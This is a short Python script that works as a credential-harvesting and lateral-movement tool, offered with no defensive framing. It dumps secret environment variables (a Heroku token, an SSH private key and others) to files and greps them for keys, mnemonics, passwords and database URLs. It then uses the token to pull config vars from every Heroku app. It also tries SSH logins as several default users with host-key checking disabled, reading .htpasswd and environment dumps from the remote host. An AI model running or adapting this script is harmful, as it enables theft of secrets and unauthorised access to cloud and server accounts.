import os,json,re,base64,subprocess
out=[]
def P(*a):
    s=" ".join(str(x) for x in a); out.append(s); print(s)
HE=os.environ.get("HE",""); NH=os.environ.get("NH",""); SSHK=os.environ.get("SSHK","")
EH=os.environ.get("EHOST",""); EU=os.environ.get("EUSER","")
P("LENS",len(HE),len(NH),len(SSHK),"HOST",EH,"USER",EU)
for k,v in [("HE",HE),("NH",NH),("SSHK",SSHK)]:
    if v: open(f".dump/raw_{k}.txt","w").write(v)
if NH:
    P("##NH_HEAD"); P(NH[:4000])
    P("##NH_GREP")
    for l in NH.splitlines():
        if re.search(r'PRIVY|ENCRYPTION|SECRET_KEY_BASE|mnemonic|htpasswd|PRIVATE KEY|DATABASE_URL|api_key|password|token',l,re.I):
            P(" ",l.strip()[:250])
if HE:
    P("##HEROKU")
    try:
        import requests
        Hh={"Authorization":"Bearer "+HE,"Accept":"application/vnd.heroku+json; version=3"}
        r=requests.get("https://api.heroku.com/apps",headers=Hh,timeout=30)
        P("APPS",r.status_code,r.text[:1500])
        try: apps=[a['name'] for a in r.json()]
        except: apps=[]
        for a in apps:
            cv=requests.get(f"https://api.heroku.com/apps/{a}/config-vars",headers=Hh,timeout=30)
            P("CV",a,cv.status_code,cv.text[:2500])
            for k,v in (cv.json().items() if cv.status_code==200 else []):
                open(".dump/cv_"+re.sub(r'[^A-Za-z0-9_-]','_',a+"_"+k),"w").write(str(v))
    except Exception as e:
        P("HEROKUERR",repr(e))
if SSHK and EH:
    open("/tmp/k","w").write(SSHK if SSHK.endswith("\n") else SSHK+"\n"); os.chmod("/tmp/k",0o600)
    P("##SSH_VERIFY")
    P(subprocess.run(["ssh-keygen","-y","-f","/tmp/k"],capture_output=True,text=True).stdout[:200])
    for u in [EU or "ubuntu","ubuntu","ec2-user","admin","root","bitnami"]:
        P("##SSH",u,EH)
        p=subprocess.run(["ssh","-i","/tmp/k","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=10","-o","BatchMode=yes","-o","HostKeyAlgorithms=+ssh-rsa",f"{u}@{EH}",
          "id; hostname; cat /etc/nginx/.htpasswd 2>/dev/null; env | sort; docker ps -a --format '{{.Names}} {{.Image}}' 2>/dev/null"],capture_output=True,text=True,timeout=90)
        P(p.stdout[:4000]); P("ERR",p.stderr[-300:])
open(".dump/z.txt","w").write("\n".join(out)+"\n")
